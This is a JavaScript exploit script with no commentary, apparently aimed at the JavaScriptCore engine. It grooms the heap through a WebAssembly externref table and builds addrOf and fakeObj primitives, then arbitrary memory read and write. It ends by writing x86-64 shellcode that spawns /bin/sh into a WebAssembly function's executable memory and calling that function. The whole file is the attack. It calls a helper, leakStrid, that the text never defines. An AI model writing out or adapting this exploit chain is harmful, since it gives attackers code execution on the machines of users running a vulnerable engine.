const table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

for (let i = 0; i < 8; i++) {
    table.grow(1, new Array(0x100).fill(1.1));
}

edenGC();

for (let i = 0; i < 0x1000; i++) {
    new Uint8Array(new ArrayBuffer());
}

gc();

for (let i = 0; i < 0x100; i++) {
    [undefined];
}

const object_arr = [undefined];
const float_helper = new DataView(new ArrayBuffer(8));

function itof(x) {
    float_helper.setBigUint64(0, x, true);  
    return float_helper.getFloat64(0, true);
}

function ftoi(x) {
    float_helper.setFloat64(0, x, true);
    return float_helper.getBigUint64(0, true);
}

function addrOf(obj) {
    object_arr[0] = obj;
    return ftoi(table.get(0)[0x2888]);
}

function fakeObj(addr) {
    table.get(0)[0x2888] = itof(addr);
    return object_arr[0];
}

const victim = [];
victim.a = undefined;

const fake = fakeObj(addrOf({
    header: fakeObj((0x01082407n << 32n) + BigInt(leakStrid([1.1]))),
    butterfly: victim,
}) + 0x10n);

function arbRead(addr) {
    fake[1] = itof(addr + 0x10n);
    return addrOf(victim.a);
}

function arbWrite(addr, val) {
    fake[1] = itof(addr + 0x10n);
    victim.a = fakeObj(val);
}

const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
const wasmModule = new WebAssembly.Module(wasmCode);
const wasmInstance = new WebAssembly.Instance(wasmModule);
const func = wasmInstance.exports.main;

const rwx = arbRead(arbRead(addrOf(func) + 0x30n));

const shellcode = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];

for (let i = 0; i < shellcode.length + 7; i += 8) {
    let code64 = 0n;

    for (let j = 0; j < 8 && i + j < shellcode.length; j++) {
        code64 |= BigInt(shellcode[i + j]) << BigInt(8 * j);
    }

    arbWrite(rwx + BigInt(i), code64);
}

func();
